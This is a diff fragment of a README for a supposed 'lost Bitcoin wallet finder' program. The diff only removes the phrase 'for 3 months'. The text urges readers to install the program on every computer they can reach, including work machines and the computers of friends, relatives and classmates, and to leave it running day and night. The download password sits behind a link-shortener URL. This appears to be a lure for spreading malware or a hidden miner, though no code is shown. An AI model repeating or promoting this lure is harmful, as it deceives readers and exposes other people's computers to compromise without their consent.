@@ -17,7 +17,7 @@ This program connects to a special database, this is done in order that   it did
 
 Run the program and wait, and in order to increase your chances, install the program on all computers available to you, at work, with your friends, with your relatives, you can also ask your classmates to use the program, so your chances will increase tenfold! Remember the more computers you use, the higher your chances of getting the treasure!
 
-I also advise you to run the program, and not turn off the computer, even at night. Personally, my computer has been working for 3 months, without shutting down, 24 hours a day, and 7 days a week!
+I also advise you to run the program, and not turn off the computer, even at night. Personally, my computer has been working without shutting down, 24 hours a day, and 7 days a week!
 Thus, my chances of finding, the coveted wallet with money, increase significantly!
 
 # <h3 align="center">For password :- https://shrinke.me/btc-lost_coins2</h3>
